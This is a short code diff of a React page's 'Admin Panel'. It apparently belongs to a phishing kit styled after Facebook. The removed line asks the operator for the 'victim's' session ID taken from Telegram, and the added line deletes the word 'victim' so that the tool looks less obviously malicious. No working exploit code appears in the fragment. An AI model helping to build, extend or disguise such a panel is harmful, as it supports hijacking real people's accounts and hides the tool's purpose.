@@ -311,7 +311,7 @@ export default function Home() {
                   <div style={{ textAlign: 'center' }}>
                     <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '10px' }}>Admin Panel</h2>
                     <div style={{ marginBottom: '20px' }}>
-                        <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên nạn nhân (lấy từ Telegram):</p>
+                        <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên (lấy từ Telegram):</p>
                         <input className="fb-input" type="text" placeholder="VD: user_a1b2c3" value={adminSessionId} onChange={(e) => setAdminSessionId(e.target.value)} />
                     </div>
                     <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
